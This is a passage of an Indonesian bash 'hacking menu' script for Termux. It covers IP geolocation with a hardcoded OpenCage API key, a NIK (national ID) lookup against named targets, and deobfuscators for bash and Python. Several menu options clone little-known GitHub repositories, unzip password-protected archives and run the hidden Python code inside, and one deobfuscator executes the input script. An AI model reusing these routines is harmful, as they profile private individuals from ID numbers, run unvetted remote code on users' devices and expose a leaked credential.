⢀⣠⡤⠴⠒⠃⠀⠀⠀⠈⠉⠀⠀⠈⣏⠀⠀⠸⣇⣀⣾⣵⣯⣷⠈⠔⢁⠔⡰⠁
⣟⠉⠙⢦⡀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠹⣄⠀⠀⠀⠈⣹⠋⢹⣾⣾⣿⠟⠋⠀⠀
⠘⢦⡀⠀⢹⣆⠀⠀⠀⠀⣈⠙⠂⠀⣠⠚⢷⡦⠤⢴⡃⠀⠠⣭⠇⠀⠀⠀⠀⠀
⠀⠀⠉⠒⠁⠈⠓⠒⠺⡏⠉⠉⢳⢻⡀⠀⠀⢇⠀⠀⠿⠟⠓⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠴⠒⠉⠀⠀⠀⣸⢸⠁⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣷⣤⣀⣀⡤⠚⠁⣾⣠⣴⣾⣿⣷⣶⣶⠶⠆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⠿⣿⣿⣿⣿⣶⣦⠀⠸⠿⠟⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${NC}"
  echo -e "${BG_BLUE}${WHITE} ☠️  [TRACKSX IP v1.0]  ☠️ ${NC}"
  echo -e "${BG_RED}${WHITE}[ ® POWERED BY Thonxyzz404 ® ]${NC}\n"
}
if ! command -v jq &> /dev/null; then
  echo -e "${RED}Error:${NC} ${YELLOW}Command 'jq' not found.${NC}"
  echo -e "${WHITE}Install it using:${NC} ${GREEN}sudo apt install jq${NC} (Debian/Ubuntu) or ${GREEN}pkg install jq${NC} (Termux)."
  echo ""
fi
clear
show_banner
OPENCAGE_API_KEY="3d490832c8724048bf9ee19b6918f4a9"
track_ip() {
  echo -e "${GREEN} Masukkan IP Target...!! ${NC}"
  read -p "╰┈┈➤ " ip
  if [[ -z $ip ]]; then
    echo -e "${RED}Error:${NC} IP address cannot be empty."
    return
  fi
  echo -e "${YELLOW}Tracking IP: ${WHITE}$ip${NC}"
  response=$(curl -s "https://ipinfo.io/$ip/json")
  if [[ $response == *"error"* ]]; then
    echo -e "${RED}Error:${NC} Invalid IP address or tracking failed."
    return
  fi
  ip_address=$(echo "$response" | jq -r '.ip')
  city=$(echo "$response" | jq -r '.city')
  region=$(echo "$response" | jq -r '.region')
  country=$(echo "$response" | jq -r '.country')
  org=$(echo "$response" | jq -r '.org')
  postal=$(echo "$response" | jq -r '.postal')
  timezone=$(echo "$response" | jq -r '.timezone')
  loc=$(echo "$response" | jq -r '.loc')
  clear
  show_banner
  echo ""
  echo -e "${GREEN}=== Tracking Results ?? ===${NC}"
  echo -e "${WHITE}IP Address      : ${GREEN}$ip_address${NC}"
  echo -e "${WHITE}City            : ${GREEN}$city${NC}"
  echo -e "${WHITE}Region          : ${GREEN}$region${NC}"
  echo -e "${WHITE}Country         : ${GREEN}$country${NC}"
  echo -e "${WHITE}Operator (ASN)  : ${GREEN}$org${NC}"
  echo -e "${WHITE}Postal Code     : ${GREEN}$postal${NC}"
  echo -e "${WHITE}Time Zone       : ${GREEN}$timezone${NC}"
  echo -e "${WHITE}Location (Lat/Lon): ${GREEN}$loc${NC}"
  echo ""
  if [[ ! -z $loc ]]; then
    latitude=$(echo "$loc" | cut -d',' -f1)
    longitude=$(echo "$loc" | cut -d',' -f2)
    echo -e "${YELLOW}Retrieving additional information...${NC}"
    opencage_response=$(curl -s "https://api.opencagedata.com/geocode/v1/json?q=$latitude+$longitude&key=$OPENCAGE_API_KEY")
    if [[ $opencage_response == *"error"* ]]; then
      echo -e "${RED}Error:${NC} Failed to retrieve additional data."
    else
      formatted_address=$(echo "$opencage_response" | jq -r '.results[0].formatted')
      country_code=$(echo "$opencage_response" | jq -r '.results[0].components.country_code')
      confidence=$(echo "$opencage_response" | jq -r '.results[0].confidence')
      echo -e "${GREEN}=== Additional Information ☠️ ===${NC}"
      echo -e "${WHITE}Full Address    : ${GREEN}$formatted_address${NC}"
      echo -e "${WHITE}Country Code    : ${GREEN}$country_code${NC}"
      echo -e "${WHITE}Data Accuracy   : ${GREEN}$confidence${NC}"
    fi
  else
    echo -e "${RED}No location data available for further details.${NC}"
  fi
}
track_ip
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
     4|04)
c='\033[36;1m'
r='\033[31;1m'
clear
echo "
⠀⠀⠀⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠀⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀
" | lolcat
if [ -z "$1" ]; then
  echo -e "${c}"
  read -p "Masukkan IP Target : " IP
else
  IP=$1
fi
echo ""
curl -s "https://ipinfo.io/$IP/json" | jq .
echo ""
echo -e "${r}Hasil Data IP Address Terdapatkan...!!"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
     ;;
5|05)
clear 
echo ""
read -p "$(echo -e "${y}Enter IP target ${g}: ${c}➤ ")" ip
echo ""
curl -s "http://ipwho.is/$ip" | jq
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
         6|06) 
               clear
             ;;
        *)
             ;;
           esac
             ;;
       17)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
blue='\033[34;1m'
green='\033[32;1m'
cyan='\033[36;1m'
red='\033[31;1m'
yellow='\033[33;1m'
echo ""
echo -e "${green} Sedang Menginstall Package...!!"
sleep 2
echo -e "${yellow}"
pkg install jq wget curl cowsay -y
pkg install ruby php python python3 -y
gem install lolcat
bacot() {
echo "
 ██████╗ ███████╗██╗███╗   ██╗████████╗
██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║   ██║╚════██║██║██║╚██╗██║   ██║   
╚██████╔╝███████║██║██║ ╚████║   ██║   
 ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝ By.Thonxyzz404
"
echo ""
}
echo ""
clear
bacot | lolcat
echo -e "${green}"
read -p "Masukkan NIK Target Anda : " niknya_kontol
echo ""
clear
bacot | lolcat
if ! command -v nik-parse &> /dev/null; then
    echo -e "${red}Package Belum Terinstall, Menginstall Dulu...!!"
    sleep 2
    echo ""
    cd /data/data/com.termux/files/usr/include/ || mkdir -p /data/data/com.termux/files/usr/include/ && cd /data/data/com.termux/files/usr/include/
    git clone --depth 32 https://github.com/SokHengkell022/Nik-Osint &> /dev/null
    cd Nik-Osint || exit
    unzip -o -P "ThonxyZZ-123" Nik-404.sh &> /dev/null
    git stash &> /dev/null
    git pull origin main &> /dev/null
    npm install -g nik-parse &> /dev/null
fi
echo -e "${green}Sedang Memproses Data...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${yellow}Loading....!! ${red}[ ${green}$((i * 10))% ${red}]"
    sleep 0.3
done
echo -ne "\r${yellow}Loading....!! ${red}[ ${green}100% ${red}]"
sleep 1
echo ""
echo -e "\n${red}Data Berhasil Diproses...!!"
sleep 1
echo -e "${green}"
nik-parse -n "$niknya_kontol"
              echo""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
              ;;
       18)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
b='\033[34;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo ""
echo "
██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║█████╗  ██║     ██║   ██║██║  ██║█████╗  ██║  ██║
██║  ██║██╔══╝  ██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║
██████╔╝███████╗╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝
╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝ 
" | lolcat
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thonxyzz404              ${b}║"
echo -e "║${g} GITHUB ${r}= ${c}Thonxyzz404HanX             ${b}║"
echo -e "║${g} AKUN TIKTOK ${r}= ${c}@thonxyzz404           ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "${b}║${r}  [ ${g}01 ${r}] ${y}Base_32                      ${b}║"
echo -e "${b}║${r}  [ ${g}02 ${r}] ${y}Base_64                      ${b}║"
echo -e "${b}║${r}  [ ${g}03 ${r}] ${y}Obsufcute                    ${b}║"
echo -e "${b}║${r}  [ ${g}04 ${r}] ${y}Decomplate_2                 ${b}║"
echo -e "${b}║${r}  [ ${g}05 ${r}] ${y}Obf_64                       ${b}║"
echo -e "${b}║${r}  [ ${g}06 ${r}] ${y}OBFV2                        ${b}║"
echo -e "${b}║${r}  [ ${g}07 ${r}] ${y}B_z_2                        ${b}║"
echo -e "${b}║${r}  [ ${g}08 ${r}] ${y}Dum_marshall                 ${b}║"
echo -e "${b}║${r}  [ ${g}09 ${r}] ${y}Lambat                       ${b}║"
echo -e "${b}║${r}  [ ${g}10 ${r}] ${y}Dec_pyc                      ${b}║"
echo -e "${b}║${r}  [ ${g}11 ${r}] ${y}Dec_Hex_html                 ${b}║"
echo -e "${b}║${r}  [ ${g}12 ${r}] ${y}Dec_PY_All                   ${b}║"
echo -e "${b}║${r}  [ ${g}13 ${r}] ${y}Dec_Kamer                    ${b}║"
echo -e "${b}║${r}  [ ${g}14 ${r}] ${y}Dec_Aes_Key                  ${b}║"
echo -e "${b}║${r}  [ ${g}15 ${r}] ${y}Dum_marshall_pyc             ${b}║"
echo -e "${b}║${r}  [ ${g}00 ${r}] ${g}Keluar                       ${b}║"
echo -e "${b}╚══════════════════════════════════════╝"
echo -e "${b}║"
echo -e "${b}║"
echo -e "${b}║"
read -p "$(echo -e "${b}╚═${r}[ ${g}Masukkan pilihan tuan 😈🔥${r} ]${c}══•➤${n} : ")" pilihan
echo -e "${c}"
case $pilihan in
    1|01)
        read -p "Masukkan_File : " nama_file
        if [ -f "/sdcard/$nama_file" ]; then
            base32 -d /sdcard/$nama_file >> /sdcard/Hasil_Base32.sh
            echo -e "${y} Kode Brasill Di Buka...!!"
            sleep 5
            echo -e "${g} Cek Hasil File Hasil_Base32.sh Di File Folder Anda..!!"
            sleep 4
        else
            echo -e "${r} File Tidak Ditemukan...!!"
            sleep 3
        fi
        ;;
    2|02)
        read -p "Masukkan_File : " nama_file
        if [ -f "/sdcard/$nama_file" ]; then
            base64 -d /sdcard/$nama_file >> /sdcard/Hasil_Base64.sh
            echo -e "${y} Kode Brasill Di Buka...!!"
            sleep 5
            echo -e "${g} Cek Hasil File Hasil_Base64.sh Di File Folder Anda..!!"
            sleep 4
        else
            echo -e "${r} File Tidak Ditemukan...!!"
            sleep 3
        fi
        ;;
    3|03)
        read -p "Masukkan_File : " nama_file
        sc="/sdcard/$nama_file"
        if [ -f "$sc" ]; then
            filedata=$(cat "$sc")
            newdata=${filedata//eval/echo}
            read -p "Input File : " out
            echo "$newdata" > "$out"
            touch tes.sh
            bash "$out" > tes.sh
            rm "$out"
            mv -f tes.sh "$out"
            echo -e "${y}Sukses...!!"
            sleep 4
        else
            echo  -e "${r}Gagall...!!"
            sleep 4
        fi
        ;;
    4|04)
clear 
echo ""
echo -e "${g} SEDANG MENGINSTALL MODULNYA YG DI PERLUKAN...!!"
echo ""
python2 -m pip install xdis==5.0.11
python2 -m pip install uncompyle6==3.7.4
clear 
echo ""
echo -e "${c} Modules selesai di install menjalankan tools...!!"
echo ""
sleep 5 
clear 
cat > Decomplate.py << 'EOF'
#!/usr/bin/python2
# Author : Thonxyzz404
# Tiktok : @thonxyzz404

import sys, re
from StringIO import StringIO
from uncompyle6.main import decompile
import marshal

_name = 'mardis'
version = "3.0"
mardis_error_decompile = "#mardis execution encountered an error!!!"
def try_decompile(code_obj):
	if isco(code_obj) == False:
		return code_obj
	paper = StringIO()
	try:
		decompile(None, code_obj, paper)
		return paper.getvalue()
	except Exception as err:
		return mardis_error_decompile
def save_code(file, string):
	open(file, "w").write(
		string
	)
def _parse(source):
	regex = re.findall("exec(.*)", source)
	amount = len(regex)
	if amount == 0:
		return 4, 0, 4
	_backup = source
	default = {}
	listv = []
	for i, value in enumerate(regex):
		listv.append("try:\n\tmardis_execute_list.append(mardis_execute%d)\nexcept Exception:\n\terr += 1" % (i))
		key = "exec" + value
		replace = "mardis_execute%d=%s" % (i, value)
		source = source.replace(key, replace)
	source += "\nerr = 0\nmardis_execute_list = []\n%s" % "\n".join(listv)
	exec(source)
	return mardis_execute_list
def isco(co):
	return hasattr(co, 'co_code')
def fn(x, iter=0):
	if x[-3:] == ".py":
		x = x[:-3]
	y = [x + ".py"]
	if iter:
		for i in range(1, iter):
			v = x + str(i) + ".py"
			y.append(v)
	return y
def view(xxx):
	try:
		return open(xxx).read()
	except Exception:
		print("file %s not found!" % xxx)
		exit()
def dis(filename, outfile, bysource=None, about=False):
	if about:
		print "# %s tools v%s" % (_name, version)
		print "# Detail https://github.com/Thonxyzz404HanX\n"
	source_code = view(filename)
	if bysource:
		source_code = bysource
	layer = 0
	while True:
		if source_code.count("exec") != 0:
			try:
				codelist = _parse(source_code)
			except Exception:
				print('\n We got an unexpected error here, please check the `%s` file to find the cause of the error.' % outfile)
				save_code(
					outfile,
					source_code
				)
				break
			amount = len(codelist)
			suck = []
			err = 0
			if amount > 1:
				print('layer%d:\n- get %s target to decompile' % (layer, amount))
			else:
				xxx = codelist[0]
				print("-> decompiling %d" % layer)
				#if isco(xxx):
				#	print('mardis layer%d: try target %s' % (layer, str(codelist[0])))
				#else:
				#	print('mardis layer%d: target is not a code type' % layer)
			for code_obj in codelist:
				execute = try_decompile(code_obj)
				if execute == mardis_error_decompile:
					err += 1
				else:
					suck.append(execute)
			amount = len(suck)
			if amount > 1:
				print('- total %d successfully decompiled' % len(suck))
				xyz = fn(outfile, iter=amount)
				for file, source in zip(xyz, suck):
					save_code(file, source)
				print('\ndecompilation results are saved to the following file\n- %s' % ('\n- '.join(xyz)))
				break
			else:
				if err > 0:
					print('\nthe decompilation process fails at this phase.')
					print('check the %s file to analyze errors' % outfile)
					save_code(outfile, source_code)
					break
				else:
					source_code = suck[0]
		else:
			if layer > 0:
				print('\nDecompilation was successful, with a total of %d layer. Results were saved to file `%s`' % (layer, outfile))
				save_code(outfile, source_code)
				break
			else:
				print('did not find code to decompile in file `%s`' % filename)
				break
		layer += 1
def main():
	outfile = "mardis_result.py"
	if len(sys.argv) < 2:
		print("Usage: %s [filename|output]" % _name)
		print("\nfilename = the file you want to decompile ")
		print("output = For files that store decompilation results, the default is `%s`" % outfile)
		exit()
	else:
		if len(sys.argv) >= 3:
			outfile = sys.argv[2]
		dis(sys.argv[1], outfile, about=True)
if __name__ == "__main__":
	main()
EOF
chmod +x Decomplate.py
read -p "Masukkan file path yang akan didecompile : " target
echo ""
python2 Decomplate.py "$target"
        ;;
    5|05)
        echo -e "${y} Decode By.Thonxyzz404 😎☕"
        echo -e "${r}"
        read -p "Masukkan Nama File Lokasi : " file
        if [ ! -f "/sdcard/$file" ]; then
            echo -e "${r}File Tidak Ditemukan...!!"
            sleep 5
        else
            dekripsi=$(cat "/sdcard/$file" | tr ';' '\n' | grep 'RzE=' | cut -d '"' -f2 | tr ' ' '\n' | rev | base64 -d)
            if [ $? -eq 0 ]; then
                echo "$dekripsi" > "/sdcard/Hasil_Dekripsi.sh"
                echo -e "${c}Hasil dekripsi telah disimpan ke /sdcard/Hasil_Dekripsi.sh"
                echo -e "${r}Nama File Yang Berhasil Di Dekripsi : $file"
                echo -e "${b}"
                read -p "Tekan Enter Untuk Kembali Ke Menu Utama...!!"
            else
                echo -e "${r}Gagall Mendekripsi Data...!!"
                echo -e "${b}"
                read -p "Tekan Enter Untuk Kembali Ke Menu Utama...!!"
            fi
        fi
        ;;
    6|06)
               deobfuscate() {
         local random_string
    random_string=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13)
    local file_name="$1"
    if [ ! -f "$file_name" ]; then
        echo ""
        echo -e "${r}File $file_name Tidak Ditemukan...!!"
        echo ""
        exit 1
    fi
    code=$(sed 's/;/\n/g' "$file_name" \
        | grep -a 'eval "$(eval $_command_dump -d <<<' \
        | sed 's/eval "$(eval \$_command_dump -d <<< "//g' \
        | sed 's/")"//g' \
        | base64 -d 2>/dev/null)
    echo "$code" > "Hasil_Dekripsi_${random_string}.sh"
    echo ""
    echo -e "${g}Sukses decoder ke hasil file : Hasil_Dekripsi_${random_string}.sh"
}
echo -e "${c}"
read -p "Masukkan Nama File Yang Ingin Didekripsi : " file_name
if [ ! -f "$file_name" ]; then
    echo ""
    echo -e "${r}File ${g}[ $file_name ]${r} Tidak Ditemukan...!!"
else
    deobfuscate "$file_name"
fi
        ;;
    7|07)
        echo -e "${c}Masukkan Lokasi File : "
        read file_path
        if [ ! -f "$file_path" ]; then
            echo -e "${r}File Tidak Ditemukan...!!"
            exit 1
        fi
        encoded_data=$(cat "$file_path")
        decoded_data=$(echo "$encoded_data" | base64 --decode 2>/dev/null | bzcat 2>/dev/null)
        if [ $? -ne 0 ]; then
            echo  -e "${r}Terjadi Kesalahan Saat Mendekompresi Data File...!!"
            exit 1
        fi
        output_path="/sdcard/hasil_dekripsi.sh"
        echo "$decoded_data" > "$output_path"
        echo -e "${g}Hasil Dekripsi Disimpan Ke $output_path"
          ;;
8|08)
          clear
          echo -e "${y}"
          tmpdir="$(mktemp -d)" || exit 1
          git clone --depth 32 https://github.com/SokHengkell022/Hahaha "$tmpdir/repo"
          cd "$tmpdir/repo" || exit 1
          unzip -o -P "Memek_Lu_Merah_456" Lambat.py 2>/dev/null || true
          clear
          python decode_pyd.py
          cd ~
          rm -rf "$tmpdir"
          ;;
9|09)
          clear
          echo -e "${g}"
          tmpdir="$(mktemp -d)" || exit 1
          git clone --depth 32 https://github.com/SokHengkell022/Apa_Lo "$tmpdir/repo"
          cd "$tmpdir/repo" || exit 1
          unzip -o -P "Lo_Mek_Lemah_099" Najis.py 2>/dev/null || true
          clear
          python Cupu.py
          cd ~
          rm -rf "$tmpdir"
            ;;
     10)
clear 
set -euo pipefail
echo ""
echo -e "${p} Development ${g}: ${c}By.Thonxyzz404"
echo -e "${y}"
read -p "Masukkan file path [ contoh : /sdcard/Folder/file.html ] : " INPUT
echo ""
if [[ ! -f "$INPUT" ]]; then
  clear 
  echo ""
  echo -e "${c} File tidak ditemukan : $INPUT"
  echo ""
fi
BASENAME=$(basename "$INPUT")
OUTPUT="/sdcard/Download/Decoder_${BASENAME%.txt}"
encoded=$(cat "$INPUT")
decoded=$(printf '%b' "${encoded//%/\\x}")
echo "$decoded" > "$OUTPUT"
echo -e "${r}[ ${g}✓ ${r}]${g} File telah di decoder menyimpan di : $OUTPUT"
echo ""
  ;;
 11)
         clear
         echo ""
         echo -e "${g} Sedang Membuka Link Apk Pylingual..!!"
         echo ""
         xdg-open "https://www.mediafire.com/file/daec96wzlqfzjpc/PYC.apk/file"
         echo ""
           ;;
    12)
clear
echo ""
echo -e "${y} Menginstall tools..!!"
echo -e "${n}"
pip install autopep8
mkdir -p Hama
git clone --depth 32 https://github.com/Blackheat023/Hama temp_clone
mv temp_clone/* temp_clone/.* Hama 2>/dev/null
rm -rf temp_clone
cd Hama || exit
unzip -o -P "Crot_dalem_memek" Dec_lol.py
clear 
echo "
██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗
██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║
██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║
██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║
██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║
╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
" | lolcat
python harum_crot.py
      ;;
13) 
clear 
echo ""
echo -e "${g} Sedang mengistall tools..!!"
echo -e "${n}"
mkdir -p Ngwe
git clone --depth 32 https://github.com/Blackheat023/Ngwe temp_clone
mv temp_clone/* temp_clone/.* Ngwe 2>/dev/null
rm -rf temp_clone
cd Ngwe || exit
unzip -o -P "Woi_Kontoll@990" Mek.py
clear 
echo ""
python Anjay.py
 ;;
14)
clear 
set -euo pipefail
figlet Thonxyzz404 | lolcat
echo ""
read -p "Masukkan path file : " INPUT_FILE
echo ""
read -p "Masukkan password AES : " AES_KEY
echo ""
cat > Aes.py <<'PYCODE'
import re
import sys
import argparse
import base64
import bz2
import zlib
import marshal
from hashlib import md5
try:
    from Crypto.Cipher import AES
except Exception as e:
    print("Module Crypto tidak ditemukan. Jalankan: pip install pycryptodome")
    raise
def pad_key(k: str) -> bytes:
    return md5(k.encode()).digest()
def aes_decrypt(data: bytes, key: str) -> bytes:
    cipher = AES.new(pad_key(key), AES.MODE_ECB)
    dec = cipher.decrypt(data)
    pad_len = dec[-1]
    if 1 <= pad_len <= 16:
        return dec[:-pad_len]
    return dec
def try_methods(data: bytes, key: str=None):
    """Coba berbagai metode penguraian; kembalikan (hasil, metode) atau (None, None)."""
    try:
        if all(32 <= b < 127 for b in data[:200]):
            d = base64.b64decode(data, validate=True)
            return d, "base64"
    except Exception:
        pass
    if key:
        try:
            return aes_decrypt(data, key), "AES"
        except Exception:
            pass
    try:
        return zlib.decompress(data), "zlib"
    except Exception:
        pass
    try:
        return bz2.decompress(data), "bz2"
    except Exception:
        pass
    try:
        obj = marshal.loads(data)
        return obj, "marshal"
    except Exception:
        pass
    return None, None
def recursive_decode(initial: bytes, key: str=None, max_stage=50, out_prefix="stage"):
    data = initial
    stage = 0
    results = []
    while stage < max_stage:
        out, method = try_methods(data if isinstance(data, (bytes, bytearray)) else marshal.dumps(data), key)
        if out is None:
            break
        print(f"[Stage {stage}] metode: {method} -> ukuran: {len(out) if isinstance(out, (bytes,bytearray)) else 'obj'}")
        fname = f"{out_prefix}{stage}.bin"
        if isinstance(out, (bytes, bytearray)):
            with open(fname, "wb") as f:
                f.write(out)
        else:
            fname = f"{out_prefix}{stage}.pyobj"
            with open(fname, "wb") as f:
                f.write(marshal.dumps(out))
        print(f"  disimpan: {fname}")
        results.append((method, fname))
        if method == "marshal":
            data = out
            break
        else:
            data = out
        stage += 1
    final_fname = "final_output.bin"
    if isinstance(data, (bytes, bytearray)):
        with open(final_fname, "wb") as f:
            f.write(data)
        try:
            txt = data.decode("utf-8")
            with open("final_output.txt", "w", encoding="utf-8") as f:
                f.write(txt)
            print(f"[Selesai] final_output.txt (teks UTF-8) dan final_output.bin (biner) dibuat.")
        except Exception:
            print(f"[Selesai] final_output.bin dibuat (bukan teks UTF-8).")
    else:
        with open("final_output.pyobj", "wb") as f:
            f.write(marshal.dumps(data))
        print("[Selesai] final_output.pyobj dibuat (marshal object).")
    return results
def extract_b64_from_file(path):
    with open(path, "rb") as f:
        raw = f.read()
    patterns = [
        rb"b64decode\(\s*b'([^']+)'\s*\)",
        rb"b64decode\(\s*b\"([^\"]+)\"\s*\)",
        rb"base64\.b64decode\(\s*b'([^']+)'\s*\)",
        rb"base64\.b64decode\(\s*b\"([^\"]+)\"\s*\)",
        rb"b'([A-Za-z0-9+/=]{50,})'",
        rb"([A-Za-z0-9+/=]{200,})"
    ]
    for p in patterns:
        m = re.search(p, raw)
        if m:
            try:
                return base64.b64decode(m.group(1))
            except Exception:
                return m.group(1)
    return None
def main():
    ap = argparse.ArgumentParser(description="Recursive decoder untuk file obfuscate (base64/AES/zlib/bz2/marshal).")
    ap.add_argument("file", help="file sumber (mis. hal.py) yang berisi blob base64")
    ap.add_argument("--key", help="key AES (jika ada)", default=None)
    ap.add_argument("--max-stage", type=int, help="maks stage recursive", default=50)
    args = ap.parse_args()
    blob = extract_b64_from_file(args.file)
    if not blob:
        print("Gagal menemukan blob base64 otomatis di file. Pastikan ada base64.b64decode(b'...') di file.")
        sys.exit(1)
    print("Blob awal ditemukan, ukuran:", len(blob))
    recursive_decode(blob, key=args.key, max_stage=args.max_stage)
if __name__ == "__main__":
    main()
PYCODE
echo ""
echo "Memeriksa modul Crypto..!!"
echo ""
if python3 - <<'PY' 2>/dev/null
try:
    import Crypto
    print("OK")
except Exception:
    raise SystemExit(1)
PY
then
    clear 
    echo ""
    echo "Modul Crypto sudah terpasang."
    echo ""
    sleep 3 
    clear 
else
    clear 
    echo ""
    echo "Modul Crypto tidak ditemukan. Mencoba menginstall pycryptodome..!!"
    sleep 3 
    echo -e "${n}"
    if command -v pip3 >/dev/null 2>&1; then
        pip3 install --user pycryptodome || pip3 install pycryptodome || true
    elif command -v pip >/dev/null 2>&1; then
        pip install --user pycryptodome || pip install pycryptodome || true
    else
        python3 -m pip install --user pycryptodome || python3 -m pip install pycryptodome || true
    fi
    clear 
    echo ""
    echo "Pemasangan selesai..!!"
    sleep 3 
fi
clear 
echo ""
echo "Menjalankan decoder..!!"
sleep 3 
echo ""
if [ -z "$AES_KEY" ]; then
    python3 Aes.py "$INPUT_FILE"
else
    python3 Aes.py "$INPUT_FILE" --key "$AES_KEY"
fi
clear 
figlet Thonxyzz404 | lolcat
echo ""
echo ""
echo "Decoder selesai silahkan cek di file tujuan anda."
echo ""
  ;;
15)
clear 
echo ""
echo -e "${g} Sedang menginstal tools..!!"
echo -e "${n}"
git clone --depth 32 https://github.com/Blackheat023/Apa_Lo-
cd Apa_Lo-
unzip -o -P "Lu_Gw_Entod@75" Wow.py
clear 
python Crot.py
  ;;
 00)
        echo -e "${c} Keluar Dari Pemograman...!!"
        echo ""
        ;;
    *)
        echo -e "${r} Perintah Tidak Di Temukan..!!"
        sleep 3
        ;;
esac
      echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
              ;;
       19)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo ""
echo "
⠀⠀⠀⣸⣏⠛⠻⠿⣿⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
